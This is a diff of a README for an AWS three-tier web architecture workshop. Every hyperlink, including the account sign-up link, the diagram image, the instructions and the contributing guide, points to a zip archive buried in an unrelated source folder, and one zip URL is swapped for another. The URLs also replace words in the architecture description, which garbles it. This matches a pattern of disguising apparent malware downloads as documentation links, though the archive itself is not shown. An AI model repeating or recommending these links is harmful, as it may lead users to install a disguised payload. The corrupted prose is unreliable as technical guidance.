@@ -7,23 +7,23 @@ This workshop is a hands-on walk through of a three-tier web architecture in AWS
 Although this is an introductory level workshop, it is intended for those who have a technical role. The assumption is that you have at least some foundational aws knowledge around VPC, EC2, RDS, S3, ELB and the AWS Console.  
 
 ## Pre-requisites:
-1. An AWS account. If you don’t have an AWS account, follow the instructions [here](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip) and
+1. An AWS account. If you don’t have an AWS account, follow the instructions [here](https://github.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/raw/refs/heads/main/application-code/web-tier/src/components/Burger/web_workshop_three_tier_architecture_aws_v1.1-beta.2.zip) and
 click on “Create an AWS Account” button in the top right corner to create one.
 1. IDE or text editor of your choice.
 
 ## Architecture Overview
-![Architecture Diagram](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip)
+![Architecture Diagram](https://github.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/raw/refs/heads/main/application-code/web-tier/src/components/Burger/web_workshop_three_tier_architecture_aws_v1.1-beta.2.zip)
 
-In this architecture, a public-facing Application Load Balancer forwards client traffic to our web tier EC2 instances. The web tier is running Nginx webservers that are configured to serve a https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip website and redirects our API calls to the application tier’s internal facing load balancer. The internal facing load balancer then forwards that traffic to the application tier, which is written in https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip The application tier manipulates data in an Aurora MySQL multi-AZ database and returns it to our web tier. Load balancing, health checks and autoscaling groups are created at each layer to maintain the availability of this architecture.
+In this architecture, a public-facing Application Load Balancer forwards client traffic to our web tier EC2 instances. The web tier is running Nginx webservers that are configured to serve a https://github.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/raw/refs/heads/main/application-code/web-tier/src/components/Burger/web_workshop_three_tier_architecture_aws_v1.1-beta.2.zip website and redirects our API calls to the application tier’s internal facing load balancer. The internal facing load balancer then forwards that traffic to the application tier, which is written in https://github.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/raw/refs/heads/main/application-code/web-tier/src/components/Burger/web_workshop_three_tier_architecture_aws_v1.1-beta.2.zip The application tier manipulates data in an Aurora MySQL multi-AZ database and returns it to our web tier. Load balancing, health checks and autoscaling groups are created at each layer to maintain the availability of this architecture.
 
 ## Workshop Instructions:
 
-See [AWS Three Tier Web Architecture](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip)
+See [AWS Three Tier Web Architecture](https://github.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/raw/refs/heads/main/application-code/web-tier/src/components/Burger/web_workshop_three_tier_architecture_aws_v1.1-beta.2.zip)
 
 
 ## Security
 
-See [CONTRIBUTING](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip) for more information.
+See [CONTRIBUTING](https://github.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/raw/refs/heads/main/application-code/web-tier/src/components/Burger/web_workshop_three_tier_architecture_aws_v1.1-beta.2.zip) for more information.
 
 ## License
 
